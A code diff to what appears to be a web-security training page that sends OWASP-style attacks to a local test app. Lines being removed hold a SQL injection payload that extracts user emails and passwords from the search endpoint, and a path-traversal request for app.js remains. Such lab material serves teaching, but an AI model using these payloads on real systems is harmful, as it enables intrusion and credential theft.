@@ -134,26 +134,6 @@ Fix: Restrict input to a known safe list of filenames and avoid appending paths 
 
 More info:
 https://owasp.org/www-community/attacks/Path_Traversal`
-  },
-  "Software and Data Integrity Failures": {
-    vulnerable: `??????????????`,
-    url: "http://localhost:3000/#/search?q=advanced",
-    secure: `Secure version not yet implemented`,
-    successful_substring: "secret",
-    attack_request: "????????",
-    custom_behavior: true,
-    server_side_exploit: true,
-    documentation: "placeholder.html"
-  },
-  "Security Logging and Monitoring Failures": {
-    vulnerable: `??????????????`,
-    url: "http://localhost:3000/rest/products/search?q=",
-    secure: `Secure version not yet implemented`,
-    successful_substring: "secret",
-    attack_request: "window.location.href = 'http://localhost:3000/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'",
-    custom_behavior: true,
-    server_side_exploit: false,
-    documentation: "placeholder.html"
   }
 }
 
@@ -208,20 +188,13 @@ async function sendExploit() {
       });
       if (response.ok) {
         const result = await response.text();
+        // https://stackoverflow.com/questions/8240101/set-content-of-iframe
+        iframe.src = 'about:blank';
+        iframe.contentWindow.document.open();
+        iframe.contentWindow.document.write(result);
+        iframe.contentWindow.document.close();
+        console.log("Response body:", result);
 
-        if (exploitData[selectedExploit].custom_behavior == true) {
-          if (selectedExploit == "Software and Data Integrity Failures") {
-            location.reload()
-          }
-        } else {
-          // https://stackoverflow.com/questions/8240101/set-content-of-iframe
-          iframe.src = 'about:blank';
-            iframe.contentWindow.document.open();
-            iframe.contentWindow.document.write(result);
-            iframe.contentWindow.document.close();
-          console.log("Response body:", result);
-
-        }
         if (result.includes(exploitData[selectedExploit].successful_substring)) {
           response_output.innerHTML = "The attack was successful!";
         } else {
@@ -232,11 +205,7 @@ async function sendExploit() {
       }
     } else { // the exploit is to be sent from the iframe.
       if (exploitData[selectedExploit].custom_behavior == true) {
-        if (selectedExploit == "Security Logging and Monitoring Failures") {
-          let url = 'http://localhost:3000/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'
-          urlbar.value = url
-          iframe.src = url
-        } if(selectedExploit == "Path Traversal"){
+      if(selectedExploit == "Path Traversal"){
         urlbar.value = exploitUrl + "?fileName=app.js"
         }
       }
